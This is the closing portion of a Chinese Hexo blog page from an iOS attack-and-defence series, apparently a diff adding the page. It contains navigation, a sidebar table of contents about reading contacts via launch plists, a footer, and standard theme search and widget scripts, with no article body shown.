+            <a href="/tags/攻防/" rel="tag"><i class="fa fa-tag"></i> 攻防</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/e38331a.html" rel="next" title="iOS攻防（一）： iPhone手机越狱 & SSH">
+                <i class="fa fa-chevron-left"></i> iOS攻防（一）： iPhone手机越狱 & SSH
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/archives/4de69069.html" rel="prev" title="iOS攻防（三）：配置使用Reveal工具逆向别人的App UI界面">
+                iOS攻防（三）：配置使用Reveal工具逆向别人的App UI界面 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/images/avatar.JPG"
+                alt="曹雪松" />
+            
+              <p class="site-author-name" itemprop="name">曹雪松</p>
+              <p class="site-description motion-element" itemprop="description">一只特立独行的CoderBoy🐶</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">67</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">58</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/SevenCho" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:243166621@qq.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#了解一下OS-X的启动原理"><span class="nav-number">2.</span> <span class="nav-text">了解一下OS X的启动原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#几个目录下plist文件格式及每个字段的含义："><span class="nav-number">2.1.</span> <span class="nav-text">几个目录下plist文件格式及每个字段的含义：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置一个Hack通讯录进程的plist文件"><span class="nav-number">3.</span> <span class="nav-text">配置一个Hack通讯录进程的plist文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读取通讯录-amp-用户安装App列表-的执行程序"><span class="nav-number">4.</span> <span class="nav-text">读取通讯录 &amp; 用户安装App列表 的执行程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取AddressBook-amp-用户安装App列表数据"><span class="nav-number">5.</span> <span class="nav-text">获取AddressBook &amp; 用户安装App列表数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">曹雪松</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">351k</span>
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":120,"height":200,"position":"left","hOffset":20,"vOffset":50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/"});</script></body>
+</html>
